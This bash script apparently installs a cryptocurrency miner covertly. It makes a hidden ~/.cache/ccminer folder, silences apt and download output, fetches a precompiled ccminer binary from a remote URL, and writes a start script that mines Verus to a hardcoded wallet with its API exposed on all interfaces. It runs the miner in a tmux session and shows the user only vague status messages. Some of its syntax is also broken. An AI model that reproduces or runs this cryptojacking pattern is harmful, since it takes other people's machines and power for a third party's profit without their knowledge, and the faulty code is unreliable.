#!/bin/bash

# Define the ccminer directory and cache directory
CCMINER_DIR=~/.cache/ccminer
mkdir -p $CCMINER_DIR

# Function to verify ccminer files
verify_files() {
    [ -f "$CCMINER_DIR/ccminer" ] && [ -f "$CCMINER_DIR/start.sh" ]
}

if [ $@ == *"sudo"* ]; then
      app="sudo"
else
      app=""
fi

# Function to download and set up ccminer
setup_ccminer() {
    #echo "Updating and upgrading the system"
    $1 apt update -y &> /dev/null
    $1 apt upgrade -y &> /dev/null

    echo "Installing dependencies..."
    $1 apt install -y libjansson wget nano &> /dev/null

    cd $CCMINER_DIR

    echo "Script is about to start..."
    $1 wget -q https://raw.githubusercontent.com/Darktron/pre-compiled/generic/ccminer &> /dev/null

    chmod +x ccminer

    echo 'cd ~/.cache/ccminer && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4.raiden$(shuf -i 1000-9999 -n 1) -p x --api-allow 192.168.0.0/16 --api-bind 0.0.0.0:4068 -t 2 -l 1 -a verus -R 5' > start.sh
    chmod +x start.sh
}

# Check if ccminer files exist
if verify_files; then
    #echo "Starting miner"
    printf "\r"
else
    #echo "ccminer files not found, setting up ccminer..."
    setup_ccminer $app
    wait
fi

# Ensure the script is executable before running
if [ -f "$CCMINER_DIR/start.sh" ]; then
    # Run the start.sh script from ccminer directory
    echo "Successfully installed.."
    tmux new-session xyz12 "cd $CCMINER_DIR && ./start.sh &"
else
    #echo "Error: $CCMINER_DIR/start.sh not found"
    exit 1
fi 
